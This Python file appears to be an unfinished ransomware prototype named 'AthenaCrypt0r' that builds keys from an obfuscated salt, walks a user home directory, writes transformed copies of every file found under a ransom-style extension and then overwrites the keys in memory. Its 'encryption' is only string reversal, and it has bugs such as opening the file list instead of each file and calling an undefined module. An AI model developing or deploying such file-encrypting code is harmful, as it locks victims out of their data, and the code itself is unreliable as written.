import getdirs
import os
import hashlib as h
import random as r
import time as t
#import urllib.request
import reverseCryptor as rc

def generateKey():
    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Secret for keygen
    salt = map(ord, keyName) # run KeyName through the ord function, set the value to salt
    r.seed(int(t.time()+r.randint(1,1337))) # generate a peusdo random seed for random
    key = h.pbkdf2_hmac('sha512', bytes(r.randint(1, 65500)), bytes(salt), r.randint(30000,60000)) # generate the encryption key - SHA512 salted, ran over a random amount of times
    encryptionKey = key.hex() # dump the key

    return encryptionKey #return it to the main function

def main(Pubkey, Privkey):
    
    print("Public Key: "+Pubkey + "\n" + "Private Key: " + Privkey)
    Pubkey = Pubkey
    Privkey = Privkey
    if os.name == "nt":
        path = "C:/TestFolder/"
    else:
        path = "/home/"



    files = getdirs.getdirs(path)

    # TODO: encryption
    reverseCryptor(files)



    # clear the key out of memory 
    for k in range(1000):
        Pubkey = r.randint(1,86400)
        Privkey = r.randint(1,86400)
        pass

    print("Nuked keys - new values are: \n"+ "Public Key: "+ str(Pubkey) + "\n" + "Private key: "+str(Privkey))


def transpositionCryptor(key, files):
        for file in files:
            f = open(files, "w+")
            encrypted = te.encryptMessage(key,f)
            f.write(encrypted)


def reverseCryptor(files):
    outputfile = ".AthenaCrypt0r"
    for file in files:
        f = open(files)
        contents = f.read()
        f.close()
        encrypted = rc.reverse(contents)
        f1 = open(files+outputfile, "w")
        f1.write(encrypted)
        f1.close()

if __name__=="__main__":
    main(generateKey(), generateKey())